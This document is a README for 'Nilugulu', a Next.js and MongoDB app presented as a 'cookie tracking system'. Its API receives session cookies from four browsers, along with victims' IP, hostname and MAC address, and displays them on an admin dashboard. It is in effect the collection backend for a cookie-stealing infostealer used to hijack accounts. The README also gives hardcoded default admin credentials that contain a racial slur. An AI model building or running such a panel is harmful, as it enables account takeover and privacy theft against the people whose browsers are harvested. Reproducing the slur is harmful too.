# Nilugulu - Cookie Tracking System

A Next.js 14 application with MongoDB backend for tracking browser cookies data.

## Features

- 🔒 **Secure Authentication**: NextAuth.js with email/password authentication
- 🍪 **Cookie Tracking**: API endpoint to receive and store browser cookie data
- 🔍 **Duplicate Detection**: Smart detection to avoid duplicate submissions
- 📊 **Dashboard**: Protected admin dashboard with filtering and pagination
- 🎨 **Modern UI**: Built with Tailwind CSS and shadcn/ui components

## Tech Stack

- **Framework**: Next.js 14 (App Router)
- **Database**: MongoDB with Mongoose
- **Authentication**: NextAuth.js
- **UI Components**: shadcn/ui
- **Styling**: Tailwind CSS
- **Language**: TypeScript

## Getting Started

### Prerequisites

- Node.js 18+ installed
- MongoDB database (Atlas or local)

### Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd nilugulu
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
   - Copy `.env.example` to `.env.local`
   - Update the values with your MongoDB URI and other settings

4. Create default admin user:
```bash
# You'll need to run the app first, then use the register page or API
# Default credentials: supernigga / jaihonilubaba
```

5. Run the development server:
```bash
npm run dev
```

6. Open [http://localhost:3000](http://localhost:3000) in your browser

## API Endpoints

### POST /api/submit-cookies
Submit browser cookies data.

**Request Body:**
```json
{
  "timestamp": "2024-01-07T12:00:00Z",
  "public_ip": "192.168.1.1",
  "device_info": {
    "os_system": "Windows",
    "os_release": "10",
    "os_version": "10.0.19044",
    "architecture": "x64",
    "hostname": "DESKTOP-ABC123",
    "mac_address": "00:11:22:33:44:55",
    "processor": "Intel Core i7"
  },
  "cookies": {
    "chrome": [
      {
        "name": "session_id",
        "value": "abc123",
        "domain": ".example.com",
        "path": "/",
        "expires": "2024-12-31T23:59:59Z",
        "secure": true,
        "http_only": true
      }
    ],
    "edge": [],
    "brave": [],
    "firefox": []
  }
}
```

### POST /api/register
Register a new user.

**Request Body:**
```json
{
  "email": "admin@example.com",
  "password": "securepassword"
}
```

### GET /api/submissions
Get all submissions (requires authentication).

**Query Parameters:**
- `page`: Page number (default: 1)
- `limit`: Items per page (default: 10)
- `startDate`: Filter by start date (ISO string)
- `endDate`: Filter by end date (ISO string)
- `browser`: Filter by browser (chrome, edge, brave, firefox)
- `ip`: Filter by IP address (partial match)

## Duplicate Detection

Submissions are considered duplicates if:
1. The MAC address is the same
2. The cookies object is exactly the same (all browsers)
3. The timestamp is within 5 minutes of an existing submission

## Project Structure

```
nilugulu/
├── app/
│   ├── api/
│   │   ├── auth/[...nextauth]/
│   │   ├── register/
│   │   ├── submit-cookies/
│   │   └── submissions/
│   ├── dashboard/
│   ├── login/
│   ├── register/
│   ├── layout.tsx
│   ├── page.tsx
│   └── globals.css
├── components/
│   └── ui/
├── lib/
│   ├── mongodb.ts
│   ├── auth.ts
│   └── utils.ts
├── models/
│   ├── User.ts
│   └── Submission.ts
└── types/
    └── next-auth.d.ts
```

## Default Admin Credentials

**Email**: supernigga  
**Password**: jaihonilubaba

⚠️ **Important**: Change these credentials immediately in production!

## License

MIT
# maksad
